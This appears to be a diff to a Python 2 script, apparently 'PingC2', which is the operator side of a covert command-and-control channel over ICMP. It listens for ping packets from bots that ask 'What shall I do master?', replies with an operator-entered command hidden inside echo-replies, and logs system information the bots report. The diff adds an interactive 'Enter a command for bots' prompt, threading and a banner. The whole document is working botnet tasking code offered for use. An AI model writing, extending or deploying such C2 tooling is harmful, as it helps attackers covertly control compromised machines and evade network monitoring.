@@ -17,16 +17,21 @@ def handler(signum, frame):
 	print 'Bye!'
 	sys.exit()
 
+def stopperCheck():
+	if runThread == True:
+		return False
+	elif runThread == False:
+		return True
+
 # Command and Control main function
 def c2main(command):
 	conf.verb = 0
         count = 1
         filter = "icmp"
         print "[*] Sniffing with filter (%s) for %d bytes" % (filter, int(count))
-
-        while True:
-                packet = sniff(count,filter=filter)
-                for p in packet:
+        while runThread == True:
+		packet = sniff(count,filter=filter)
+		for p in packet:
                         #p.show2()
                         try:
                                 request = p['Raw'].load
@@ -34,8 +39,8 @@ def c2main(command):
                                 icmp_id = p['ICMP'].id
                                 print "[*] Request: " + request
                                 if request == 'What shall I do master?':
-                                        resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/sys.argv[1]
-                                        print "[*] Response sent: " + sys.argv[1]
+                                        resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/command
+                                        print "[*] Response sent: " + command
                                         #resp.show2()
                                         send(resp)
                                 elif 'sysinfo' in request:
@@ -51,49 +56,30 @@ def c2main(command):
                                 print "[X] ERROR: ", sys.exc_info()[0]
 
 def main(argv):
-	#if len(argv) < 1:
-        #        print "----------------------------"
-        #        print "PingC2 Usage"
-        #        print " ./pingc2.py <command>"
-        #        print "----------------------------"
-        #        exit()
+	print "	 _____    _                    _____   ___  "
+ 	print "	|  __ \  (_)                  / ____| |__ \ "
+ 	print "	| |__) |  _   _ __     __ _  | |         ) |"
+ 	print "	|  ___/  | | | '_ \   / _` | | |        / / "
+ 	print "	| |      | | | | | | | (_| | | |____   / /_ "
+ 	print "	|_|      |_| |_| |_|  \__, |  \_____| |____|"
+        print "        		        _/ |                "
+        print "			     |___/		    "
+        print "						    "
+	print "			Command Center              "
+	print "			   by NoCow		    "
+        global runThread
+	runThread = True 
 	while True:
 		signal.signal(signal.SIGINT, handler)
 		command = raw_input("Enter a command for bots: ")
 		processThread = threading.Thread(target=c2main, args=([command]))
-		processThread.daemon = True
-		processThread.start()	
-	conf.verb = 0
-	count = 1
-	filter = "icmp"
-	print "[*] Sniffing with filter (%s) for %d bytes" % (filter, int(count))
-
-	while True:
-		signal.signal(signal.SIGINT, handler)
-		packet = sniff(count,filter=filter)
-		for p in packet:
-			#p.show2()
-			try:
-				request = p['Raw'].load
-				ip_id = p['IP'].id
-				icmp_id = p['ICMP'].id
-				print "[*] Request: " + request
-				if request == 'What shall I do master?':
-					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/sys.argv[1]
-					print "[*] Response sent: " + sys.argv[1]
-					#resp.show2()
-					send(resp)
-				elif 'sysinfo' in request:
-					sysinfo = request[8:]
-					print "[*] Received sysinfo from client: %s" % sysinfo
-					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/"Thanks"
-					#resp.show2()
-					print "[*] Response sent: Thanks"
-					send(resp)	
-				else:	
-					print "[**] Client not recognized"
-			except: 
-				print "[X] ERROR: ", sys.exc_info()[0]  
+		if (threading.activeCount() < 2):
+			print "[*] No threads currently running. Starting capture"
+			processThread.daemon = True
+			processThread.start()
+		else:
+			print "[*] Capture currently running. Stopping first"
+			runThread = False
 
 if __name__ == "__main__":
    main(sys.argv[1:])
